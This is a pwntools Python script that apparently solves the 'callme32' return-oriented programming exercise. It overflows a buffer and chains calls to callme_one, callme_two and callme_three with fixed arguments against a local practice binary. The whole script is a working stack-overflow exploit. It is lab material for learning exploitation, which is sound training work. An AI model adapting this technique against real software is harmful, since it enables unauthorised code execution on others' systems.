from pwn import *

elf = ELF("./callme32")

p = elf.process()
raw_input("DEBUG")

payload = b"A"*44
payload += p32(elf.sym['callme_one'])
payload += p32(0x080487f9)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)
payload += p32(elf.sym['callme_two'])
payload += p32(0x080487f9)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)
payload += p32(elf.sym['callme_three'])
payload += p32(0x080487f9)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)



p.sendline(payload)

p.interactive()
